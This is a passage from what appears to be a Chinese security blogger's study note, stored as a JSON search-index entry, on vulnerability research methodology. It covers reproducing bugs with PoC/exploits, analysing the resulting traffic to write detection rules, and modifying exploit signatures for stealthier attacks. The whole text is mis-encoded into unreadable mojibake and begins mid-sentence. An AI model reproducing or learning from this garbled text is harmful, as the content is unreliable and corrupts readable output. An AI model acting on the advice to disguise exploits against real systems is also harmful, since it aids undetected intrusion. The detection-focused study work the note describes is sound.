ä¸Šä¸‹æ–‡ï¼Œæ¼æ´æ˜¯æ€ä¹ˆå½¢æˆçš„ï¼Œå¦‚ä½•æ„é€ poc/expï¼Œåšä¸€ä¸ªæ¼æ´å¤ç°å°±ç»“æŸäº†ã€‚ è¿™æ˜¯å¾ˆå¤šæ¼æ´åˆ†ææ–‡ç« çš„é€šç—…ï¼Œè¿™äº›æ–‡ç« åœ¨å‡ºç°æ¼æ´åè·Ÿä¸€éæ¼æ´ä»£ç ï¼Œæ‰¾åˆ°æ¼æ´å‘ç”Ÿç‚¹å’Œåˆ©ç”¨æ–¹æ³•å°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰æ·±å…¥ç ”ç©¶å¼€å‘ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆå†™ï¼Œé‚£ä¹ˆä¸‹æ¬¡ä½ è¿˜æ˜¯æŒ–ä¸å‡ºæ¼æ´ã€‚ ä½†æ˜¯çœ‹äº†Pç‰›çš„æ–‡ç« ï¼Œåˆæœ‰äº†æ–°çš„è®¤çŸ¥ã€‚æˆ‘ä»¬ä¸å…‰è¦çŸ¥é“è¿™ä¸ªæ¼æ´ä»£ç å­˜åœ¨ä¹‹åçš„äº‹æƒ…ï¼Œæˆ‘ä»¬è¿˜è¦è€ƒè™‘è¿™ä¸ªä»£ç ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™ã€‚è¿™å°±è¦è€ƒè™‘è¯¥æ¼æ´çš„å½±å“ç‰ˆæœ¬ï¼Œä»æœ€æ—©çš„ç‰ˆæœ¬å’Œå†å‰ä¸€ä¸ªç‰ˆæœ¬ä¹‹é—´çš„åŒºåˆ«ï¼Œæ€è€ƒè¿™èƒŒåæ˜¯ä»€ä¹ˆè®©å¼€å‘è€…æ”¹å˜äº†ä»£ç ï¼Œå®˜æ–¹åšè¿™äº›åŠ¨ä½œçš„åŸå› ã€‚ æ¼æ´å¤ç° åˆ©ç”¨å…¬å¼€çš„poc/expï¼Œæˆ–è‡ªå·±åˆ†æåå¾—å‡ºçš„pocè¿›è¡Œæ¼æ´å¤ç°ï¼Œå¹¶æ„æ€åˆ†æå¯èƒ½çš„åˆ©ç”¨é“¾ã€‚å¯¹pocçš„åŠŸèƒ½è¿›è¡Œå®Œå–„ï¼Œå¾€expå‘å±•ã€‚ æ£€æµ‹åˆ†æ å¯¹ä½¿ç”¨poc/expè¿›è¡Œæ¼æ´å¤ç°è¿‡ç¨‹ä¸­æ‰€äº§ç”Ÿçš„æµé‡è¿›è¡Œåˆ†æï¼Œå°è¯•æå–æµé‡ç‰¹å¾ï¼Œæ€è€ƒä»€ä¹ˆæ ·çš„è§„åˆ™å¯ä»¥æ£€æµ‹åˆ°è¯¥æ”»å‡»ã€‚ ä½¿ç”¨è¯¥poc/expå¯¹ç³»ç»Ÿäº§ç”Ÿçš„å½±å“ï¼Œæ˜¯å¦æœ‰æ—¥å¿—äº§ç”Ÿï¼Œæ˜¯å¦æœ‰æ–‡ä»¶è½åœ°ç­‰ã€‚ expä¿®æ”¹ï¼Œéšè”½ç—•è¿¹ ä¿®æ”¹expç‰¹å¾ï¼Œå†™è‡ªå·±çš„expå·¥å…·ï¼Œç«Ÿå¯èƒ½åšåˆ°éšè”½å¼æ”»å‡»ã€‚ ","date":"2021-03-13","objectID":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/:2:0","tags":["éšç¬”"],"title":"001-2021å¹´4æœˆ13æ—¥ å­¦ä¹ éšç¬”","uri":"/posts/2021%E5%B9%B44%E6%9C%8813%E6%97%A5-%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/"}]